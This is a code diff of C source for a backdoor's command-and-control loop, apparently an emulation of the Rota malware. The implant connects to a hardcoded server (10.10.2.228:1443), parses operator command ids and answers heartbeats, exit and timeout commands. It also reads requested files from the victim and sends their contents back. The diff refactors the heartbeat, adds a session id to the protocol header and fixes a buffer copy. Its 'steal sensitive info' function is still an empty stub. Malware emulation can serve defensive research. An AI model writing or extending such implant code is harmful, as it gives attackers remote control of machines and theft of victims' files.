@@ -17,10 +17,11 @@
 
 
 // https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
-void c2_loop(){
+void c2_loop() {
 
     int sleepy_time = 3; // default C2 sleep time
     int sock;
+    int counter;
     const char* server_name = "10.10.2.228";
     const int server_port = 1443;
 
@@ -58,23 +59,19 @@ void c2_loop(){
         int len = 0;
         int maxlen = 65536;
         char buffer[maxlen];
+        char *cmd_id = NULL;
+        int payload_length;
 
         memset(buffer, 0, maxlen);
 
-	// will remain open until the server terminates the connection
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
         maxlen -= n;
         len += n;
 
-        //char *cmd_id = (char *)malloc(4);
-        char *cmd_id = NULL;
-        int payload_length;
-
-        // zero out cmd id
-        //memset(cmd_id, 0, 4);
-
-        // parse out cmd id
         cmd_id = parse_c2_cmdid(buffer);
+        if (!cmd_id) {
+            break;
+        }
         // get payload length
         payload_length = parse_c2_payload_len(buffer);
 
@@ -92,11 +89,7 @@ void c2_loop(){
             c2_exit(sock);
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
-            #ifdef DEBUG
-            printf("[+] Rota C2 heartbeat!");
-            #endif
-            char *buffer = "PING";
-            build_c2_response(buffer, cmd_id, sock);
+            c2_heartbeat(cmd_id, sock);
             break;
 
         }
@@ -119,6 +112,9 @@ void c2_loop(){
             build_c2_response(msg, cmd_id, sock);
         }
         else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
+
+            //c2_steal_sensitive_info(buffer, cmd_id, sock);
+
             #ifdef DEBUG
             printf("[+] Rota C2 Run steal sensitive data\n");
             #endif
@@ -139,7 +135,6 @@ void c2_loop(){
                 build_c2_response(data, cmd_id, sock);
                 free(data);
             } else {
-
                 char *msg = "file does not exist";
                 build_c2_response(msg, cmd_id, sock);
             }
@@ -310,10 +305,13 @@ void c2_exit(int sock) {
 }
 
 
-void c2_heartbeat() {
-    //TODO: what does Netlab mean by heartbeat funciton?
+void c2_heartbeat(char *cmd_id, int sock) {
+    #ifdef DEBUG
+    printf("[+] Rota C2 heartbeat!\n");
+    #endif
+       char *buffer = "PING";
+       build_c2_response(buffer, cmd_id, sock);
 }
-
 
 void c2_set_timeout(int *sleepTime, int newTime) {
     *sleepTime = newTime;
@@ -321,7 +319,8 @@ void c2_set_timeout(int *sleepTime, int newTime) {
 
 
 char *c2_steal_sensitive_info() {
-    // TODO: identify what counts as 'sensitive info'
+
+
 }
 
 
@@ -405,6 +404,9 @@ char *initial_rota_pkt() {
     // 0-> 4 == magicbytes
     memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
 
+    // bytes 4->8 session id
+    memcpy(&rotaHdr[4], sessionId, sizeof(sessionId));
+
     // payload length 8->11
     memcpy(&rotaHdr[8], payloadLen, sizeof(payloadLen));
 
@@ -461,12 +463,15 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
     int buffer_len = strlen(buffer);
     char buffer_len_hex[8] = {0x00};
 
+    // bytes 4->8 session id
+    memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));
+
     // convert and store integer in rota header
     sprintf(buffer_len_hex, "%d", buffer_len);
     memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len));
 
     // update cmd_id in response packet
-    memcpy(&rota_resp_pkt[14], cmd_id, sizeof(cmd_id));
+    memcpy(&rota_resp_pkt[14], cmd_id, 4);
     // update cmd_id in response packet
     memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));
 
